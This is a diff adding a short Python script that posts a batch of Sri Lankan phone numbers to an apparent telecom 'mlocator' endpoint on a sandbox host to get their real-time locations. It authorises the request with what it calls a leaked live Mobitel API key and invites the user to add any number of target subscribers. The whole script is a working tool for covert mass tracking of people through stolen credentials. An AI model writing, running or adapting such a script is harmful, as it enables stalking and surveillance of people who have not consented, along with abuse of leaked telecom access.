@@ -1,0 +1,32 @@
+#!/usr/bin/env python3
+import requests
+
+API_URL = "https://8000-ir356g0rpexbhdtsrpvs1-dfc00ec5.sandbox.novita.ai/mlocator/batch"
+API_KEY = "Bearer mobitel_leaked_real_apikey"  # Insert your live API key here
+
+# Batch target numbers - fill with any quantity
+msisdn_list = [
+    "94773123456",
+    "94771234567",
+    "94776321234",
+    # ... add more
+]
+
+payload = {
+    "subscribers": msisdn_list,
+    "mode": "realtime",
+    "interval": 30
+}
+
+headers = {
+    "Authorization": API_KEY,
+    "Content-Type": "application/json"
+}
+
+resp = requests.post(API_URL, json=payload, headers=headers, timeout=30)
+
+if resp.status_code == 200:
+    print("[+] Batch location results:")
+    print(resp.text)
+else:
+    print(f"[!] Error {resp.status_code}: {resp.text}")
